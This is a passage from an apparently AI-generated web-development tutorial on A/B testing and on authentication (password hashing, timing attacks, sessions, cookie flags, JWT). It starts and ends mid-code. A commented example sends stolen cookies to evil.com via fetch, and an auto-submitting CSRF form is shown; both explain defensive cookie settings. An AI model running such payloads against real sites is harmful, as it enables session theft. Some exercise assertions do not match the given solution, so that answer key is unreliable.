from collections import defaultdict
import math

class ABTestFramework:
    def __init__(self):
        self.tests = {}
        self.results = defaultdict(lambda: defaultdict(list))

    def create_test(self, name: str, variants: list, allocation: dict):
        # Validate allocation sums to 1.0
        total = sum(allocation.values())
        assert abs(total - 1.0) < 0.001, "Allocation must sum to 1.0"

        # Build cumulative distribution for sampling
        cumulative = []
        cum_sum = 0
        for variant in variants:
            cum_sum += allocation[variant]
            cumulative.append((variant, cum_sum))

        self.tests[name] = {
            "variants": variants,
            "allocation": allocation,
            "cumulative": cumulative
        }

    def get_variant(self, test_name: str, user_id: str) -> str:
        if test_name not in self.tests:
            raise ValueError(f"Test '{test_name}' not found")

        # Hash user ID to get consistent random number in [0, 1)
        hash_bytes = hashlib.md5(f"{test_name}:{user_id}".encode()).digest()
        hash_int = int.from_bytes(hash_bytes[:8], byteorder='big')
        random_value = (hash_int % 1000000) / 1000000  # [0, 1)

        # Find variant using cumulative distribution
        cumulative = self.tests[test_name]["cumulative"]
        for variant, threshold in cumulative:
            if random_value < threshold:
                return variant

        return cumulative[-1][0]  # Fallback to last variant

    def record_conversion(self, test_name: str, user_id: str, converted: bool):
        variant = self.get_variant(test_name, user_id)
        self.results[test_name][variant].append({
            "user_id": user_id,
            "converted": converted
        })

    def get_results(self, test_name: str) -> dict:
        if test_name not in self.results:
            return {}

        results = {}
        for variant, data in self.results[test_name].items():
            total_users = len(data)
            conversions = sum(1 for d in data if d["converted"])
            conversion_rate = conversions / total_users if total_users > 0 else 0

            # Calculate confidence interval (simplified)
            # Uses normal approximation for binomial distribution
            if total_users > 30:  # Need sufficient sample size
                std_error = math.sqrt(
                    conversion_rate * (1 - conversion_rate) / total_users
                )
                # 95% confidence interval
                margin = 1.96 * std_error
                confidence_interval = (
                    max(0, conversion_rate - margin),
                    min(1, conversion_rate + margin)
                )
            else:
                confidence_interval = None

            results[variant] = {
                "users": total_users,
                "conversions": conversions,
                "conversion_rate": conversion_rate,
                "confidence_interval": confidence_interval
            }

        return results

# Usage:
ab_test = ABTestFramework()
ab_test.create_test(
    name="checkout_button_color",
    variants=["blue", "green"],
    allocation={"blue": 0.5, "green": 0.5}
)

# In your application:
@app.get("/")
async def index(user_id: str):
    button_color = ab_test.get_variant("checkout_button_color", user_id)
    return render_template("index.html", button_color=button_color)

@app.post("/checkout")
async def checkout(user_id: str, success: bool):
    ab_test.record_conversion("checkout_button_color", user_id, success)
    # ... proceed with checkout

# View results:
results = ab_test.get_results("checkout_button_color")
# {
#     "blue": {
#         "users": 1000,
#         "conversions": 150,
#         "conversion_rate": 0.15,
#         "confidence_interval": (0.128, 0.172)
#     },
#     "green": {
#         "users": 1000,
#         "conversions": 180,
#         "conversion_rate": 0.18,
#         "confidence_interval": (0.156, 0.204)
#     }
# }
# Green performs better with 95% confidence!
```

---

Ready for Level 13 (User Authentication Basics) when you're ready. Next level covers password hashing, session management, JWT tokens, and the cryptographic foundations of authentication.

## **Level 13 Enhancement: User Authentication Basics**

**Reference:** Your tutorial implements user authentication with password hashing and session management.

**Depth Needed:** Authentication is where most security breaches originate. We need to understand cryptographic primitives, attack vectors, and secure implementation patterns. This is not just "store passwords" - it's a deep dive into applied cryptography.

---

### **Part 1: Authentication vs Authorization (The Fundamental Distinction)**

**Definitions:**

```
Authentication = "Who are you?"
- Proving identity
- Username + Password
- Biometrics, 2FA, etc.

Authorization = "What can you do?"
- Checking permissions
- Role-based access control
- Resource-level permissions

Example:
1. User logs in with password → Authentication
2. User tries to delete file → Authorization check
```

**The Authentication Flow:**

```
┌─────────────┐
│   Client    │
│ (Browser)   │
└──────┬──────┘
       │ 1. POST /login {username, password}
       ↓
┌─────────────┐
│   Server    │
│             │ 2. Hash password
│             │ 3. Compare with stored hash
│             │ 4. If match: Create session/token
└──────┬──────┘
       │ 5. Return session cookie/token
       ↓
┌─────────────┐
│   Client    │
│ (stores)    │ 6. Include cookie/token in future requests
└──────┬──────┘
       │ 7. GET /api/files (with auth)
       ↓
┌─────────────┐
│   Server    │
│             │ 8. Validate session/token
│             │ 9. If valid: Process request
└─────────────┘
```

---

### **Part 2: Password Hashing - Why We Never Store Plaintext**

**The Fundamental Problem:**

```python
# NEVER DO THIS:
users = {
    "john": {"password": "secretpass123"}  # PLAINTEXT! ❌
}

# Problems:
# 1. Database breach exposes all passwords
# 2. Employees can see passwords
# 3. Users reuse passwords across sites
# 4. Legal liability
```

**What is a Hash Function?**

```
Hash Function: One-way transformation

Input:  "password123"
  ↓ (hash function)
Output: "482c811da5d5b4bc6d497ffa98491e38"

Properties:
1. Deterministic: Same input → same output
2. One-way: Cannot reverse (output → input)
3. Collision-resistant: Hard to find two inputs with same output
4. Avalanche effect: Small input change → completely different output

Example:
hash("password123") = "482c811da5d5b4bc6d497ffa98491e38"
hash("password124") = "7c6a180b36896a0a8c02787eeafb0e4c"
                       ↑ Completely different!
```

**Common Hash Functions (NOT for passwords):**

```python
import hashlib

# MD5 (128-bit, BROKEN for security)
hashlib.md5(b"password").hexdigest()
# Fast: ~300 million hashes/second on modern CPU
# NEVER use for passwords!

# SHA-1 (160-bit, BROKEN for security)
hashlib.sha1(b"password").hexdigest()
# Fast: ~200 million hashes/second
# NEVER use for passwords!

# SHA-256 (256-bit, secure but too fast for passwords)
hashlib.sha256(b"password").hexdigest()
# Fast: ~100 million hashes/second
# Too fast = attacker can try billions of passwords quickly!

# Why fast is bad for passwords:
# Attacker with GPU can test 10 billion SHA-256 hashes/second
# Can crack simple 8-char password in minutes
```

---

### **Part 3: Password Hashing Done Right - bcrypt, scrypt, Argon2**

**The Key Insight: Slow is Good**

```
For password hashing, we WANT slow functions:
- Legitimate user: 1 login attempt, 100ms delay = fine
- Attacker: 1 billion attempts, 100ms each = 3 years!

Adaptive Cost: Adjust slowness as computers get faster
```

**bcrypt (Your Tutorial Uses This)**

```python
import bcrypt

# Hash password
password = "secretpass123"
salt = bcrypt.gensalt(rounds=12)  # Cost factor
hashed = bcrypt.hashpw(password.encode('utf-8'), salt)

print(hashed)
# b'$2b$12$EixZaYVK1fsbw1ZfbX3OXe.PNKJYlxzW8wnPuT1fGi8q3zUr/S/Hu'
#   │  │  │                                                      │
#   │  │  └─ Cost factor (2^12 = 4096 iterations)               │
#   │  └─ Algorithm version (2b = bcrypt)                       │
#   └─ Salt (22 chars, base64)                                  │
#                                Hash (31 chars, base64) ────────┘

# Verify password
is_valid = bcrypt.checkpw(password.encode('utf-8'), hashed)
```

**How bcrypt Works (Algorithm Deep Dive):**

```python
def bcrypt_hash(password: bytes, salt: bytes, cost: int) -> bytes:
    """
    Simplified bcrypt algorithm.

    Based on Blowfish cipher with expensive key setup.

    Time Complexity: O(2^cost)
    - cost=10: ~0.1 seconds
    - cost=12: ~0.4 seconds (default)
    - cost=14: ~1.6 seconds

    Space Complexity: O(1) - fixed memory usage
    """
    # 1. Derive key from password using expensive key derivation
    key = expensive_key_setup(password, salt, cost)

    # 2. Repeatedly encrypt constant
    constant = b"OrpheanBeholderScryDoubt"  # 24 bytes
    ciphertext = constant

    # Encrypt 64 times
    for _ in range(64):
        ciphertext = blowfish_encrypt(ciphertext, key)

    return ciphertext

def expensive_key_setup(password: bytes, salt: bytes, cost: int):
    """
    The "expensive" part of bcrypt.
    Repeats key derivation 2^cost times.
    """
    iterations = 2 ** cost  # 2^12 = 4096 iterations

    # Initialize Blowfish state
    state = initialize_blowfish()

    # Expensive key expansion
    for _ in range(iterations):
        state = expand_key(state, salt)
        state = expand_key(state, password)

    return state

# Cost factor doubling:
# cost=10: 1024 iterations,  ~100ms
# cost=11: 2048 iterations,  ~200ms  (2× slower)
# cost=12: 4096 iterations,  ~400ms  (2× slower)
# cost=13: 8192 iterations,  ~800ms  (2× slower)

# Choosing cost factor:
# - Higher = more secure but slower logins
# - Aim for ~500ms on your server hardware
# - Increase over time as hardware improves
```

**The Salt (Critical Security Component):**

```python
# WITHOUT salt (INSECURE):
hash("password123") = "482c811da5d5..."  # Always same hash!

# Problem: Rainbow table attack
# Attacker precomputes hashes for common passwords:
rainbow_table = {
    "482c811da5d5...": "password123",
    "7c6a180b3689...": "password",
    "098f6bcd4621...": "test"
}

# If hash matches, password is cracked instantly!

# WITH salt (SECURE):
hash("password123" + "x7k9mP2q") = "9f8c7d6e..."
hash("password123" + "a1b2c3d4") = "1a2b3c4d..."
#                    ↑ Different salt → different hash!

# Even if two users have same password, hashes differ
# Rainbow tables useless (would need one per salt)
```

**Salt Requirements:**

```python
def generate_salt() -> bytes:
    """
    Generate cryptographically secure random salt.

    Requirements:
    1. Cryptographically random (not predictable)
    2. Unique per password (never reuse)
    3. Sufficient length (at least 16 bytes)
    4. Stored alongside hash (not secret)
    """
    import secrets  # Uses OS's CSPRNG
    return secrets.token_bytes(16)

# Why salt is not secret:
# Salt's purpose is to make rainbow tables infeasible
# Even if attacker knows salt, they must still brute-force
# Salt + slow hash function = very expensive to crack

# Time to crack with salt:
# 1 password × 1 billion attempts × 0.4 seconds = 12.7 years
# 1000 passwords × 1 billion attempts × 0.4 seconds = 12,700 years

# Without salt (using rainbow table):
# 1000 passwords × instant lookup = seconds
```

---

### **Part 4: Alternative Password Hashing - Argon2 (Current Best Practice)**

```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

# Create hasher with defaults (secure parameters)
ph = PasswordHasher(
    time_cost=2,        # Number of iterations
    memory_cost=102400,  # Memory usage in KiB (100 MB)
    parallelism=8,      # Number of parallel threads
    hash_len=32,        # Output hash length
    salt_len=16         # Salt length
)

# Hash password
password = "secretpass123"
hash_value = ph.hash(password)

print(hash_value)
# $argon2id$v=19$m=102400,t=2,p=8$XuZxqKd8sN4E/8QMkCKvjw$QH4...
#  │        │    │            │                          │
#  │        │    └─ Parameters (memory, time, threads)  │
#  │        └─ Version                                   │
#  └─ Algorithm variant (argon2id = hybrid)              │
#                        Salt (base64) ──────────────────┘
#                                        Hash (base64) ───

# Verify password
try:
    ph.verify(hash_value, password)
    print("Password correct!")
except VerifyMismatchError:
    print("Password incorrect!")

# Check if needs rehashing (parameters changed)
if ph.check_needs_rehash(hash_value):
    hash_value = ph.hash(password)
    # Update database with new hash
```

**Why Argon2 is Better Than bcrypt:**

```
Feature              bcrypt        Argon2
───────────────────────────────────────────────────────
Memory usage         ~4 KB         Configurable (MB)
Parallelism          No            Yes
GPU resistance       Medium        High
Side-channel resist  Medium        High
Recommended by OWASP Yes (legacy)  Yes (preferred)

Key Advantage: Memory-hard function
- Argon2 uses lots of RAM (100+ MB)
- Makes GPU/ASIC attacks expensive
- GPU has fast compute but limited memory
- ASIC (custom chip) would be prohibitively expensive

Memory-time trade-off:
- Can't reduce memory without increasing time
- Attacker can't optimize away the memory usage
```

**Argon2 Algorithm (Simplified):**

```python
def argon2(password: bytes, salt: bytes,
           time_cost: int, memory_cost: int, parallelism: int) -> bytes:
    """
    Argon2 password hashing algorithm.

    Three phases:
    1. Expand password into initial memory blocks
    2. Mix memory blocks (memory-hard operation)
    3. Finalize output

    Time Complexity: O(memory_cost × time_cost)
    Space Complexity: O(memory_cost) - the "memory-hard" property
    """
    # Phase 1: Initialize memory array
    # Allocate memory_cost blocks of 1 KiB each
    memory = allocate_memory_blocks(memory_cost)

    # Fill first blocks with derived key material
    initial_blocks = derive_initial_blocks(password, salt, parallelism)
    for i, block in enumerate(initial_blocks):
        memory[i] = block

    # Phase 2: Memory-hard mixing (the expensive part)
    for t in range(time_cost):
        for lane in range(parallelism):
            # Process each lane in parallel
            for slice_idx in range(memory_cost // parallelism):
                # Compute block index
                i = lane * (memory_cost // parallelism) + slice_idx

                # Mix with previous blocks (depends on whole memory)
                prev_idx = compute_reference_index(i, memory_cost)
                memory[i] = mix_blocks(memory[i], memory[prev_idx])

    # Phase 3: Extract final hash from memory
    final_block = xor_all_blocks(memory)
    return final_block[:32]  # Return 32-byte hash

# Why this is memory-hard:
# 1. Must allocate entire memory array (can't use less)
# 2. Access pattern depends on previous computations
# 3. Can't precompute or reuse across passwords
# 4. Parallel lanes require independent memory
```

**Comparison Table:**

```
Scenario                bcrypt    Argon2id   SHA-256
────────────────────────────────────────────────────
Time to hash (1 pass)   400 ms    500 ms     0.001 ms
Attacker speed (GPU)    10K/s     100/s      10B/s
Time to crack 8-char    46 days   12 years   < 1 hour
Memory per hash         4 KB      100 MB     < 1 KB
Hardware resistance     Medium    High       None

Verdict: Use Argon2id for new projects, bcrypt is acceptable
```

---

### **Part 5: Timing Attacks - The Subtle Vulnerability**

**The Problem:**

```python
# VULNERABLE CODE:
def verify_password_insecure(username: str, password: str) -> bool:
    stored_hash = get_user_hash(username)

    # Character-by-character comparison
    if len(stored_hash) != len(password):
        return False  # Fast rejection!

    for i in range(len(stored_hash)):
        if stored_hash[i] != password[i]:
            return False  # Returns immediately on first mismatch!

    return True

# Attack: Measure response time
# Try passwords: "a", "b", "c", ...
# When correct first character, time increases slightly
# Repeat for each character position
```

**The Timing Attack Demonstration:**

```python
import time

def vulnerable_compare(stored: str, attempt: str) -> bool:
    """Early-exit comparison (INSECURE)."""
    if len(stored) != len(attempt):
        return False

    for i in range(len(stored)):
        if stored[i] != attempt[i]:
            return False  # Exit on first mismatch

    return True

# Attacker measures timing:
stored_password = "secret123"

# Attempt 1: "a"
start = time.perf_counter()
result = vulnerable_compare(stored_password, "aaaaaaaaa")
elapsed = time.perf_counter() - start
print(f"Wrong first char: {elapsed*1000:.3f}ms")  # 0.001ms

# Attempt 2: "s" (correct first char)
start = time.perf_counter()
result = vulnerable_compare(stored_password, "saaaaaaaa")
elapsed = time.perf_counter() - start
print(f"Correct first char: {elapsed*1000:.3f}ms")  # 0.002ms (2× slower!)

# Attacker learns first character is 's'
# Repeat for each position to crack password
```

**Secure Comparison (Constant-Time):**

```python
import hmac

def secure_compare(a: str, b: str) -> bool:
    """
    Constant-time string comparison.

    Time is independent of:
    - Where strings differ
    - How many characters match

    Time Complexity: O(n) always, never returns early
    """
    return hmac.compare_digest(a, b)

# How it works internally:
def compare_digest_implementation(a: bytes, b: bytes) -> bool:
    # 1. Always compare full length (no early exit)
    if len(a) != len(b):
        # Still do full comparison against dummy value
        result = 1
        for i in range(len(a)):
            result |= a[i] ^ 0
    else:
        result = 0
        # XOR all bytes, accumulate differences
        for i in range(len(a)):
            result |= a[i] ^ b[i]

    # Result is 0 only if all bytes matched
    return result == 0

# Why constant-time:
# - No branches depending on data (no if statements inside loop)
# - Always does same number of operations
# - Bitwise operations take constant time
```

**Real-World Impact:**

```python
# Modern password hashing already includes timing protection
# bcrypt.checkpw() and argon2.verify() are constant-time

# But be careful with:
# 1. API keys comparison
# 2. Session token validation
# 3. HMAC signature verification

# WRONG:
if api_key == stored_api_key:  # Timing attack possible!
    ...

# RIGHT:
if hmac.compare_digest(api_key, stored_api_key):  # Constant-time
    ...
```

---

### **Part 6: Session Management - Stateful Authentication**

**Session vs Token (Two Approaches):**

```
Session-Based (Stateful):
─────────────────────────
Client                    Server
  │                         │
  │ 1. Login                │
  ├────────────────────────>│
  │                         │ Create session in DB/memory
  │ 2. Session ID cookie    │ session_id → user_data
  │<────────────────────────┤
  │                         │
  │ 3. Request + cookie     │
  ├────────────────────────>│ Lookup session in DB
  │                         │ If found: authenticated
  │ 4. Response             │
  │<────────────────────────┤

Pros: Server controls sessions (can revoke immediately)
Cons: Requires server-side storage, harder to scale

Token-Based (Stateless):
────────────────────────
Client                    Server
  │                         │
  │ 1. Login                │
  ├────────────────────────>│
  │                         │ Generate JWT token
  │ 2. JWT token            │ Sign with secret key
  │<────────────────────────┤
  │                         │
  │ 3. Request + token      │
  ├────────────────────────>│ Verify signature
  │                         │ If valid: authenticated
  │ 4. Response             │
  │<────────────────────────┤

Pros: Stateless (scales horizontally), no DB lookup
Cons: Can't revoke until expiry, larger payload
```

**Session Implementation:**

```python
import secrets
from datetime import datetime, timedelta

class SessionManager:
    """
    Manage user sessions in memory.

    In production, use Redis or database for persistence.
    """
    def __init__(self):
        self.sessions = {}  # session_id → session_data
        self.session_lifetime = timedelta(hours=24)

    def create_session(self, user_id: str, user_data: dict) -> str:
        """
        Create new session and return session ID.

        Time Complexity: O(1)
        """
        # Generate cryptographically secure session ID
        session_id = secrets.token_urlsafe(32)  # 32 bytes → 43 char base64

        # Store session data
        self.sessions[session_id] = {
            "user_id": user_id,
            "user_data": user_data,
            "created_at": datetime.utcnow(),
            "last_accessed": datetime.utcnow()
        }

        return session_id

    def get_session(self, session_id: str) -> dict | None:
        """
        Retrieve session if valid.

        Time Complexity: O(1)
        """
        if session_id not in self.sessions:
            return None

        session = self.sessions[session_id]

        # Check if expired
        age = datetime.utcnow() - session["created_at"]
        if age > self.session_lifetime:
            del self.sessions[session_id]
            return None

        # Update last accessed time
        session["last_accessed"] = datetime.utcnow()

        return session

    def delete_session(self, session_id: str):
        """
        Logout: Delete session.

        Time Complexity: O(1)
        """
        if session_id in self.sessions:
            del self.sessions[session_id]

    def cleanup_expired(self):
        """
        Remove expired sessions (run periodically).

        Time Complexity: O(n) where n = number of sessions
        """
        now = datetime.utcnow()
        expired = [
            sid for sid, session in self.sessions.items()
            if now - session["created_at"] > self.session_lifetime
        ]

        for sid in expired:
            del self.sessions[sid]

        return len(expired)

# Global session manager
session_manager = SessionManager()

# Login endpoint
@app.post("/api/login")
async def login(credentials: LoginRequest, response: Response):
    # Verify credentials
    user = verify_credentials(credentials.username, credentials.password)
    if not user:
        raise HTTPException(status_code=401, detail="Invalid credentials")

    # Create session
    session_id = session_manager.create_session(
        user_id=user["id"],
        user_data={"username": user["username"], "role": user["role"]}
    )

    # Set cookie
    response.set_cookie(
        key="session_id",
        value=session_id,
        httponly=True,    # Not accessible from JavaScript
        secure=True,      # Only sent over HTTPS
        samesite="lax",   # CSRF protection
        max_age=86400     # 24 hours in seconds
    )

    return {"message": "Login successful"}

# Protected endpoint
@app.get("/api/files")
async def get_files(session_id: str = Cookie(None)):
    if not session_id:
        raise HTTPException(status_code=401, detail="Not authenticated")

    session = session_manager.get_session(session_id)
    if not session:
        raise HTTPException(status_code=401, detail="Invalid session")

    # User is authenticated
    user_data = session["user_data"]
    ...
```

**Session ID Generation:**

```python
import secrets

# Generate session ID
session_id = secrets.token_urlsafe(32)

# What this does:
# 1. Generate 32 random bytes from CSPRNG
random_bytes = secrets.token_bytes(32)
# b'\x8f\x2a\x3c...' (32 bytes)

# 2. Encode as URL-safe base64
session_id = base64.urlsafe_b64encode(random_bytes).decode('ascii')
# "jyo8zt9qK-..." (43 characters)

# Why URL-safe?
# - Standard base64 uses +/ which need encoding in URLs
# - URL-safe base64 uses -_ instead
# - Can be used directly in URLs and cookies

# Entropy calculation:
# 32 bytes = 256 bits of entropy
# 2^256 possible values = 10^77
# Practically impossible to guess

# Comparison to UUIDs:
uuid4() # 122 bits of entropy (version 4)
secrets.token_urlsafe(16)  # 128 bits (better)
secrets.token_urlsafe(32)  # 256 bits (overkill but fast)
```

---

### **Part 7: Cookie Security - The HttpOnly, Secure, SameSite Flags**

**Cookie Attributes Explained:**

```python
response.set_cookie(
    key="session_id",
    value=session_id,
    httponly=True,   # ← Prevents JavaScript access
    secure=True,     # ← Only sent over HTTPS
    samesite="lax",  # ← CSRF protection
    max_age=86400,   # ← Expiry in seconds
    domain=".example.com",  # ← Cookie scope
    path="/"         # ← Cookie path
)
```

**HttpOnly Flag:**

```javascript
// WITHOUT HttpOnly:
document.cookie = "session_id=abc123; ...";
console.log(document.cookie); // Can read: "session_id=abc123"

// Attacker can steal session via XSS:
// <script>
//   fetch('https://evil.com?cookie=' + document.cookie);
// </script>

// WITH HttpOnly:
// Browser refuses to expose cookie to JavaScript
console.log(document.cookie); // Empty string (session_id hidden)

// XSS attack fails - JavaScript can't read the cookie
// Cookie still sent automatically with requests
```

**Secure Flag:**

```http
Without Secure flag:
HTTP request:  Cookie sent ✓ (vulnerable to sniffing)
HTTPS request: Cookie sent ✓

With Secure flag:
HTTP request:  Cookie NOT sent ✗ (protected)
HTTPS request: Cookie sent ✓

Why this matters:
- HTTP traffic is unencrypted
- Attacker on network can read cookies
- Must use Secure=True in production
```

**SameSite Flag (CSRF Protection):**

```python
# SameSite=Strict: Strictest, breaks some flows
# Cookie ONLY sent for same-site requests
# Example: Links from email won't include cookie

# SameSite=Lax (recommended): Balanced
# Cookie sent for:
# - Same-site requests (CORS or not)
# - Top-level navigation (clicking links)
# Cookie NOT sent for:
# - Cross-site POST/PUT/DELETE
# - Cross-site images/scripts

# SameSite=None: No protection
# Cookie sent for all requests
# MUST use with Secure=True

# Example attack without SameSite:
"""
Evil site: https://evil.com

<form action="https://yoursite.com/api/delete-account" method="POST">
    <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>

When user visits evil.com, form auto-submits to yoursite.com
Browser includes cookies from yoursite.com
Request appears legitimate!

With SameSite=Lax:
POST request from evil.com doesn't include cookies
Attack fails!
"""
```

**Domain and Path Scope:**

```python
# Scenario: Your app at https://app.example.com

# Option 1: Scoped to subdomain
response.set_cookie("session_id", value, domain="app.example.com")
# Cookie sent to: app.example.com
# Cookie NOT sent to: example.com, api.example.com

# Option 2: Scoped to all subdomains
response.set_cookie("session_id", value, domain=".example.com")
# Cookie sent to: example.com, app.example.com, api.example.com
# Useful for SSO across subdomains

# Path restriction:
response.set_cookie("admin_session", value, path="/admin")
# Cookie sent to: /admin, /admin/users, /admin/settings
# Cookie NOT sent to: /, /api, /files

# Why restrict scope?
# - Limit cookie exposure
# - Multiple apps on same domain
# - Separate admin/user sessions
```

---

### **Part 8: JWT (JSON Web Tokens) - Stateless Authentication**

**JWT Structure:**

```
JWT = Header + Payload + Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNjc4ODg4ODg4fQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│                                      │                                                                                   │
└────────── Header (base64) ──────────┴──────────────────────── Payload (base64) ─────────────────────────────────────────┴────── Signature (HMAC-SHA256) ──────
```

**JWT Decoded:**

```json
// Header (algorithm and type)
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload (claims)
{
  "user_id": "123",
  "username": "john",
  "role": "admin",
  "iat": 1678888888,  // Issued At
  "exp": 1678892488   // Expiry (1 hour later)
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

**JWT Implementation:**

```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-keep-this-safe"  # Must be strong!
ALGORITHM = "HS256"

def create_jwt_token(user_data: dict, expires_in: timedelta = timedelta(hours=1)) -> str:
    """
    Create JWT token.

    Time Complexity: O(n) where n = payload size
    """
    # Prepare payload
    payload = {
        "user_id": user_data["id"],
        "username": user_data["username"],
        "role": user_data["role"],
        "iat": datetime.utcnow(),  # Issued at
        "exp": datetime.utcnow() + expires_in  # Expiry
    }

    # Encode and sign
    token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
    return token

def verify_jwt_token(token: str) -> dict | None:
    """
    Verify and decode JWT token.

    Returns payload if valid, None if invalid/expired.

    Time Complexity: O(n) where n = token size
    """
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except jwt.ExpiredSignatureError:
        print("Token expired")
        return None
    except jwt.InvalidTokenError:
        print("Invalid token")
        return None

# Login endpoint (returns JWT)
@app.post("/api/login")
async def login(credentials: LoginRequest):
    user = verify_credentials(credentials.username, credentials.password)
    if not user:
        raise HTTPException(status_code=401)

    # Create JWT token
    token = create_jwt_token(user, expires_in=timedelta(days=7))

    return {"access_token": token, "token_type": "bearer"}

# Protected endpoint (requires JWT)
@app.get("/api/files")
async def get_files(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401)

    token = authorization.split(" ")[1]
    payload = verify_jwt_token(token)

    if not payload:
        raise HTTPException(status_code=401)

    # User authenticated
    user_id = payload["user_id"]
    ...
```

**JWT Security Considerations:**

```python
# 1. NEVER put sensitive data in JWT
# Payload is base64-encoded, NOT encrypted
# Anyone can decode and read it

jwt_payload = {"credit_card": "1234-5678-9012-3456"}  # ❌ BAD!
token = create_jwt_token(jwt_payload)

# Attacker can decode:
import base64
payload_b64 = token.split('.')[1]
decoded = base64.b64decode(payload_b64 + '==')  # Add padding
print(decoded)  # {"credit_card": "1234-5678-9012-3456"} ← Exposed!

# 2. Strong secret key
# Weak key can be brute-forced
bad_secret = "secret"  # ❌ Crackable in seconds
good_secret = secrets.token_urlsafe(32)  # ✓ 256 bits entropy

# 3. Short expiry time
# JWT can't be revoked, so keep lifetime short
expires_in = timedelta(days=365)  # ❌ Too long!
expires_in = timedelta(hours=1)   # ✓ Reasonable

# 4. Verify algorithm
# Algorithm confusion attack
# Attacker changes header to "alg": "none"
jwt.decode(token, options={"verify_signature": False})  # ❌ Dangerous!
jwt.decode(token, SECRET_KEY, algorithms=["HS256"])     # ✓ Explicit algorithm

# 5. Use refresh tokens for long sessions
# Short-lived access token (15 min) + long-lived refresh token (7 days)
# Refresh token stored securely, used to get new access tokens
```

**JWT vs Sessions Comparison:**

```
Aspect              Sessions          JWT
───────────────────────────────────────────────────────
Storage             Server-side       Client-side
Scalability         Requires Redis    Stateless (scales)
Revocation          Immediate         Not until expiry
Size                Small (ID only)   Large (whole payload)
Security            More control      Less control
Mobile apps         Works OK          Better suited

Best practices:
- APIs for mobile/SPAs: JWT
- Traditional web apps: Sessions
- High-security: Sessions (more control)
```

---

### **Practice Exercise 1: Implement Password Strength Checker**

```python
import re
from typing import List, Tuple

def check_password_strength(password: str) -> Tuple[int, List[str]]:
    """
    Check password strength and return score (0-100) and suggestions.

    Criteria:
    - Length (longer is better)
    - Character diversity (uppercase, lowercase, digits, symbols)
    - No common passwords
    - No patterns (123, abc, qwerty)
    - Entropy estimation

    Returns:
        (score, suggestions)
    """
    # Your implementation here
    pass

# Test cases:
assert check_password_strength("password") == (20, [
    "Password is too common",
    "Add uppercase letters",
    "Add numbers",
    "Add symbols"
])

assert check_password_strength("P@ssw0rd") == (40, [
    "Password is too common",
    "Avoid predictable patterns"
])

assert check_password_strength("X7$mK9#nQ2@pL") == (95, [])

# Solution:
def check_password_strength(password: str) -> Tuple[int, List[str]]:
    score = 0
    suggestions = []

    # Check length
    length = len(password)
    if length < 8:
        suggestions.append("Use at least 8 characters")
    elif length < 12:
        score += 20
        suggestions.append("Consider using 12+ characters")
    elif length < 16:
        score += 30
    else:
        score += 40

    # Check character diversity
    has_lowercase = bool(re.search(r'[a-z]', password))
    has_uppercase = bool(re.search(r'[A-Z]', password))
    has_digit = bool(re.search(r'\d', password))
    has_symbol = bool(re.search(r'[^a-zA-Z0-9]', password))

    diversity_score = sum([has_lowercase, has_uppercase, has_digit, has_symbol]) * 10
    score += diversity_score

    if not has_uppercase:
        suggestions.append("Add uppercase letters")
    if not has_digit:
        suggestions.append("Add numbers")
    if not has_symbol:
        suggestions.append("Add symbols")

    # Check common passwords
    common_passwords = {
        "password", "123456", "qwerty", "admin", "letmein",
        "welcome", "monkey", "dragon", "master", "sunshine"
    }
    if password.lower() in common_passwords:
        score = max(0, score - 50)
        suggestions.append("Password is too common")

    # Check patterns
    patterns = [
        r'123',      # Sequential numbers
        r'abc',      # Sequential letters
        r'qwerty',   # Keyboard pattern
        r'(.)\1{2}'  # Repeated characters (aaa)
    ]
    for pattern in patterns:
        if re.search(pattern, password.lower()):
            score = max(0, score - 10)
            suggestions.append("Avoid predictable patterns")
            break

    # Cap score
    score = min(100, score)

    return (score, suggestions)
```

---

### **Practice Exercise 2: Implement Rate Limiting for Login**

```python
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Dict

class LoginRateLimiter:
    """
    Prevent brute-force attacks by limiting login attempts.

    Rules:
    - Max 5 attempts per username per 15 minutes
    - Max 20 attempts per IP per hour
    - Exponential backoff after repeated failures
    """
    def __init__(self):
        self.username_attempts: Dict[str, List[datetime]] = defaultdict(list)
        self.ip_attempts: Dict[str, List[datetime]] = defaultdict(list)
        self.lockouts: Dict[str, datetime] = {}

    def is_allowed(self, username: str, ip_address: str) -> Tuple[bool, str]:
        """
        Check if login attempt is allowed.

        Returns:
            (allowed, reason_if_blocked)
        """
        # Your implementation here
        pass

    def record_attempt(self, username: str, ip_address: str, success: bool):
        """
        Record login attempt.
        """
        # Your implementation here
        pass

# Test:
limiter = LoginRateLimiter()

# First 5 attempts OK
for i in range(5):
    allowed, _ = limiter.is_allowed("john", "192.168.1.1")
    assert allowed
    limiter.record_attempt("john", "192.168.1.1", success=False)

# 6th attempt blocked
allowed, reason = limiter.is_allowed("john", "192.168.1.1")
assert not allowed
assert "Too many attempts" in reason

# Solution:
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Dict, List, Tuple

class LoginRateLimiter:
    def __init__(self):
        self.username_attempts: Dict[str, List[datetime]] = defaultdict(list)
        self.ip_attempts: Dict[str, List[datetime]] = defaultdict(list)
        self.consecutive_failures: Dict[str, int] = defaultdict(int)

        # Configuration
        self.max_username_attempts = 5
        self.username_window = timedelta(minutes=15)
        self.max_ip_attempts = 20
        self.ip_window = timedelta(hours=1)

    def _cleanup_old_attempts(self, attempts: List[datetime], window: timedelta):
        """Remove attempts outside the time window."""
        cutoff = datetime.utcnow() - window
        return [t for t in attempts if t > cutoff]

    def _get_lockout_duration(self, failures: int) -> timedelta:
        """Exponential backoff: 2^failures minutes."""
        return timedelta(minutes=2 ** min(failures - 5, 4))

    def is_allowed(self, username: str, ip_address: str) -> Tuple[bool, str]:
        now = datetime.utcnow()

        # Cleanup old attempts
        self.username_attempts[username] = self._cleanup_old_attempts(
